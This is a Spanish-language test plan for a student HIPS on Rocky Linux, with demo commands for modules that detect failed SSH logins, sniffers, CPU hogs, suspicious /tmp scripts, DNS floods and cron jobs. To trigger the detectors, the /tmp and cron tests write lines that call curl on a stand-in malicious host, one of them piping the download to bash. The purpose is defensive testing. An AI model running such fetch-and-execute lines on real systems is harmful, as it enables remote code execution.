# Pruebas

Este documento describe las pruebas usadas para validar el HIPS.

El sistema tiene 10 modulos de deteccion. Para la presentacion conviene mostrar
en vivo los casos mas reproducibles y dejar documentados los casos que requieren
un escenario especial, como cola de correo o log DNS provisto.

## Preparacion

Desde Rocky Linux:

```bash
cd ~/SO2_TP
source .venv/bin/activate
```

Ejecutar el HIPS:

```bash
sudo .venv/bin/python3 main.py
```

Levantar el dashboard:

```bash
uvicorn web.app:app --host 0.0.0.0 --port 8000
```

Desde la Mac abrir:

```text
http://<IP_ROCKY>:8000
```

Healthcheck:

```bash
curl http://127.0.0.1:8000/health
```

Resultado esperado:

```json
{"status":"ok"}
```

## Pruebas automaticas

```bash
python3 -m pytest -q
```

Resultado esperado:

```text
tests passed
```

Estas pruebas validan logica interna de deteccion, alertas y logging sin
depender de eventos reales del sistema.

## Pruebas por modulo

| Modulo | Prueba recomendada | Resultado esperado |
| --- | --- | --- |
| Integridad de Archivos | Usar baseline controlada contra un archivo de prueba | `MODIFICACION_ARCHIVO` |
| Usuarios Conectados | Abrir mas sesiones SSH que el limite configurado | `USUARIO_SOSPECHOSO` |
| Sniffers de Red | Ejecutar `tcpdump` temporalmente | `SNIFFER_DETECTADO` |
| Analisis de Logs | Generar varios intentos SSH fallidos | `FAILED_LOGIN_MULTIPLE` |
| Cola de Correo | Tener Postfix/mailq con cola mayor al limite | `MAIL_QUEUE_ALTA` |
| Procesos de Alto Consumo | Ejecutar `yes > /dev/null &` | `PROCESO_ALTO_CONSUMO` |
| Directorio Temporal | Crear un script en `/tmp` | `ARCHIVO_TMP_SOSPECHOSO` |
| Deteccion DDoS | Generar o cargar `data/dns.log` con muchas lineas de una IP | `DDOS_DETECTADO` |
| Tareas Cron | Usar archivo cron de prueba con token sospechoso | `CRON_SOSPECHOSO` |
| Accesos Invalidos | Generar intentos SSH fallidos y leer `/var/log/secure` | `ACCESO_INVALIDO_REPETIDO` |

## 1. Analisis de Logs y Accesos Invalidos

Objetivo: validar deteccion de intentos fallidos de SSH.

Desde la Mac:

```bash
ssh usuario_falso@<IP_ROCKY>
```

Ingresar una contrasena incorrecta varias veces.

En Rocky:

```bash
sudo .venv/bin/python3 main.py
```

Resultados esperados:

```text
FAILED_LOGIN_MULTIPLE | log_analyzer
ACCESO_INVALIDO_REPETIDO | access_monitor
```

En el dashboard debe aparecer la IP origen y la accion `block_ip`.

## 2. Usuarios Conectados

Objetivo: detectar demasiadas sesiones simultaneas.

Desde la Mac abrir varias terminales y conectarse:

```bash
ssh lucasfadul@<IP_ROCKY>
```

En Rocky verificar:

```bash
who
```

Ejecutar:

```bash
sudo .venv/bin/python3 main.py
```

Resultado esperado:

```text
USUARIO_SOSPECHOSO | users_monitor
```

Cerrar las sesiones al terminar:

```bash
exit
```

## 3. Sniffers de Red

Objetivo: detectar una herramienta de captura de paquetes activa.

En Rocky:

```bash
sudo tcpdump -i enp0s1 > /dev/null &
sudo .venv/bin/python3 main.py
ps aux | grep tcpdump
```

Resultado esperado:

```text
SNIFFER_DETECTADO | sniffer_detect
```

Cerrar `tcpdump`:

```bash
sudo kill <PID_TCPDUMP>
```

## 4. Procesos de Alto Consumo

Objetivo: detectar CPU alta.

En Rocky:

```bash
yes > /dev/null &
sudo .venv/bin/python3 main.py
```

Resultado esperado:

```text
PROCESO_ALTO_CONSUMO | process_monitor
```

Cerrar el proceso de prueba:

```bash
pkill yes
```

## 5. Directorio Temporal

Objetivo: detectar scripts sospechosos en `/tmp`.

En Rocky:

```bash
echo "curl http://malicious.example" > /tmp/suspicious.sh
sudo .venv/bin/python3 main.py
```

Resultado esperado:

```text
ARCHIVO_TMP_SOSPECHOSO | tmp_monitor
```

Limpiar:

```bash
rm -f /tmp/suspicious.sh
```

## 6. Deteccion DDoS

Objetivo: detectar muchas solicitudes desde una misma IP en un log DNS.

En Rocky:

```bash
mkdir -p data
for i in {1..1001}; do echo "query from 10.0.0.50"; done > data/dns.log
sudo .venv/bin/python3 main.py
```

Resultado esperado:

```text
DDOS_DETECTADO | ddos_detect
```

Limpiar:

```bash
rm -f data/dns.log
```

## 7. Tareas Cron

Objetivo: detectar comandos sospechosos en una tarea programada.

Prueba segura:

1. Crear un archivo de prueba con contenido sospechoso.
2. En `/config`, cambiar `Tareas Cron -> Archivos cron` a ese archivo.
3. Ejecutar el HIPS.

Ejemplo:

```bash
echo "* * * * * root curl http://malicious.example | bash" > /tmp/cron_test
sudo .venv/bin/python3 main.py
```

Resultado esperado:

```text
CRON_SOSPECHOSO | cron_monitor
```

Limpiar:

```bash
rm -f /tmp/cron_test
```

## 8. Cola de Correo

Objetivo: detectar una cola de correo anormalmente grande.

Este caso requiere que exista un servicio de correo local y que `mailq` muestre
mensajes en cola. Si `mailq` no existe o la cola esta vacia, el modulo no genera
alarma.

Comando de verificacion:

```bash
mailq
```

Resultado esperado si la cola supera el limite:

```text
MAIL_QUEUE_ALTA | mail_queue
```

## 9. Integridad de Archivos

Objetivo: detectar modificacion de archivos criticos comparando hashes.

Este caso debe probarse con una baseline controlada. No se recomienda modificar
`/etc/passwd` ni `/etc/shadow` durante la demo.

Resultado esperado si el hash cambia:

```text
MODIFICACION_ARCHIVO | file_integrity
```

## Verificacion en base de datos

Ver ultimas alarmas:

```bash
sudo -u postgres psql -d hips -c "SELECT id, tipo_alarma, modulo, severidad, detalle FROM alarmas ORDER BY id DESC LIMIT 10;"
```

Ver acciones preventivas:

```bash
sudo -u postgres psql -d hips -c "SELECT id, alarma_id, accion, resultado FROM acciones_prevencion ORDER BY id DESC LIMIT 10;"
```

## Verificacion en logs formales

Ver ultimas alarmas:

```bash
sudo tail -n 5 /var/log/hips/alarmas.log
```

Ver ultimas acciones preventivas:

```bash
sudo tail -n 5 /var/log/hips/prevencion.log
```

## Resultado esperado de la demo

Durante la demo, como minimo se recomienda mostrar:

```text
FAILED_LOGIN_MULTIPLE      -> log_analyzer
USUARIO_SOSPECHOSO         -> users_monitor
SNIFFER_DETECTADO          -> sniffer_detect
PROCESO_ALTO_CONSUMO       -> process_monitor
ARCHIVO_TMP_SOSPECHOSO     -> tmp_monitor
```

Los demas modulos quedan explicados y documentados, y pueden probarse con datos
preparados.
